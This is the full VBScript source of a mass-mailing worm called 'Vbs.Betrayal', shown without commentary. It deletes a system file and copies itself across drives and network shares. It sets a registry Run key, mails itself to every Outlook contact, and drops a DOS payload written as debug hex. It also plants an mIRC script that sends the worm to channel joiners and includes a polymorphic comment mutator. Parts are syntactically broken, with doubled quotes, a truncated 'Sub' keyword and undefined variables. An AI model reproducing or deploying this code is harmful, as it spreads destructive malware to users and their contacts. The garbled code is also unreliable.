"'Vbs.Betrayal
'coded by A.v_Killer(PakBrain)
On Error Resume Next
Set W_S = CreateObject(""""WScript.Shell"""")
Set fso = CreateObject(""""Scripting.FileSystemObject"""")
fso.DeleteFile(""""c:\windows\rundll32.exe"""")
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
vbscopy=file.ReadAll
main()
Mutator()
RegW
spreadnetwrk()
DosDrop()
DosStart()
IRC()
sub main()
On Error Resume Next
dim wscr,rr, strMsg
set wscr=CreateObject(""""WScript.Shell"""")
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
Set dirtemp = fso.GetSpecialFolder(2)
Set cFile = fso.GetFile(WScript.ScriptFullName)
cFile.Copy(dirsystem&""""\Betrayal.vbs"""")
cFile.Copy(""""c:\Betrayal.vbs"""")
cFile.Copy(""""c:\Betrayal.bat"""")
cFile.Copy(""""c:\Betrayal.ini"""")
cFile.Copy(""""c:\Betrayal.pif"""")
cFile.Copy(""""c:\Program Files\Betrayal.vbs"""")
cFile.Copy(""""c:\My Documents\Betrayal.vbs"""")
     
Set OutlookA = CreateObject(""""Outlook.Application"""")
If OutlookA = """"Outlook"""" Then
Set Mapi=OutlookA.GetNameSpace(""""MAPI"""")
Set AddLists=Mapi.AddressLists
For Each ListIndex In AddLists
If ListIndex.AddressEntries.Count <> 0 Then
ContactCountX = ListIndex.AddressEntries.Count
For Count= 1 To ContactCountX
Set MailX = OutlookA.CreateItem(0)
Set ContactX = ListIndex.AddressEntries(Count)
msgbox contactx.address
Mailx.Recipients.Add(ContactX.Address)
msgbox contactx.address
Mailx.Recipients.Add(ContactX.Address)
MailX.To = ContactX.Address
MailX.Subject = """"u can't betray me""""
MailX.Body = vbcrlf&""""Wat ur Heart Says WAT u Listen Oh FRIEND""""&vbcrlf
Set Attachment=MailX.Attachments
Attachment.Add dirsystem & """"\Betrayal.vbs""""
Mailx.Attachments.Add(dirsystem & """"\Betrayal.vbs"""")
Mailx.Attachments.Add(dirsystem & """"\Betrayal.vbs"""")
Mailx.Attachments.Add(""""C:\Betrayal.vbs"""")
MailX.DeleteAfterSubmit = True
If MailX.To <> """""""" Then
MailX.Send
End If
Next
End If
Next
Function Mutator (CodeToMutate)
Strings = Split (CodeToMutate, vbCrLf)
CommentsCount = Cbyte (GetRndNumber(3, UBound(Strings) / 1.5))
CommentPlace = Cbyte (UBound(Strings) / CommentsCount)
y = 0
For b = 0 To UBound(Strings) Step 1
DoMutateBody = DoMutateBody & Strings(b) & vbCrLf
y = y + 1
If y = CommentPlace Then
Comment = MakeComment
DoMutateBody = DoMutateBody & Comment
y = 0
End If
Next
Mutator = DoMutateBody
End Function
Function MakeComment
CommentLenght = Cbyte (GetRndNumber(3, 30))
DoComment = Chr(39)
For z = 1 To CommentLenght Step 1
a = CByte(GetRndNumber (65, 122))
If a < 91 Or a > 96 Then
DoComment = DoComment & Chr(a)
Else
z = z - 1
End If
Next
MakeComment = DoComment & vbCrLf
End Function
Function GetRndNumber (r_a, r_b)
Randomize
r_c = (r_b - r_a) * Rnd + r_a
GetRndNumber = r_c
End Function
ub RegW ()
Set Regedit = CreateObject(""WScript.Shell"")
Regedit.RegWrite ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\vbs"",dwinsys&""\Betrayal.vbs""
End sub
Sub spreadnetwrk(nname)
Set drve = ntw.EnumNetworkDrives
If drve.Count > 0 Then
For j = 0 To drve.Count -1
If drve.Item(j) <> """" Then
fso.GetFile(WScript.ScriptFullName).Copy(drve.Item(j) & ""\"" & nname)
End If
Next
End If
End Sub
Sub DosDrop ()
On Error Resume Next
dim c,d
Set fso = CreateObject(""Scripting.FileSystemObject"")
Set d = fso.CreateTextFile(dwin&""\COMMAND\Betrayal.bat"", True)
d.WriteLine ""@ debug < Betrayal.scr""
d.WriteLine ""@ cls""
d.WriteLine ""@ cd \""
d.close
Set fso = CreateObject(""Scripting.FileSystemObject"")
Set c = fso.CreateTextFile(dwin&""\COMMAND\Betrayal.scr"", True)
c.WriteLine ""N Betrayal.com""
c.WriteLine """"
c.WriteLine ""E 0100 E8 00 00 5D 81 ED 03 01 B8 21 35 CD 21 89 1E 6F""
c.WriteLine ""E 0110 01 8C 06 71 01 B8 21 25 BA 22 01 CD 21 BA 8E 01""
c.WriteLine ""E 0120 CD 27 3D 00 4B 75 47 50 53 51 52 55 56 57 1E 06""
c.WriteLine ""E 0130 B9 F4 01 B0 53 E8 28 00 B0 69 E8 23 00 B0 6D E8""
c.WriteLine ""E 0140 1E 00 B0 6F E8 19 00 B0 6E E8 14 00 B0 61 E8 0F""
c.WriteLine ""E 0150 00 B0 03 E8 0A 00 B0 03 E8 05 00 E2 D6 EB 06 90""
c.WriteLine ""E 0160 B4 0E CD 10 C3 07 1F 5F 5E 5D 5A 59 5B 58 EA 00""
c.WriteLine ""E 0170 00 00 00 53 49 4D 4F 4E 41 03 03 18 62 79 20 52""
c.WriteLine ""E 0180 61 64 69 78 31 36 5B 4D 49 4F 4E 53 5D""
c.WriteLine ""RCX""
c.WriteLine ""8D""
c.WriteLine ""W""
c.WriteLine ""Q""
c.close
End Sub
Sub DosStart ()
On Error Resume Next
Set File1 = Simona.GetFile(dwin&""\DStart.bat"")
File1.copy (dwin&""\Dos.bat"")
Set fso = CreateObject(""Scripting.FileSystemObject"")
Set a = fso.CreateTextFile(dwin&""\DStart.bat"", True)
a.WriteLine ""@ Cd ""&dwin&""\COMMAND""
a.WriteLine ""@ Betrayal.com""
a.WriteLine ""@ cls""
a.WriteLine ""@ Cd..""
a.WriteLine ""@ Dos.bat""
a.close
End Sub
Sub IRC ()
On Error Resume Next
Set fso = CreateObject(""Scripting.FileSystemObject"")
Set e = fso.CreateTextFile(""c:\mirc\script.ini"", True)
e.WriteLine ""[script]""
e.WriteLine ""n0=ON 1:JOIN:#:{ /if ( $nick == $me ) { halt }""
e.WriteLine ""n1=/dcc send $nick ""&dwinsys&""\Betrayal.vbs""
e.WriteLine ""}""
e.close
End sub"
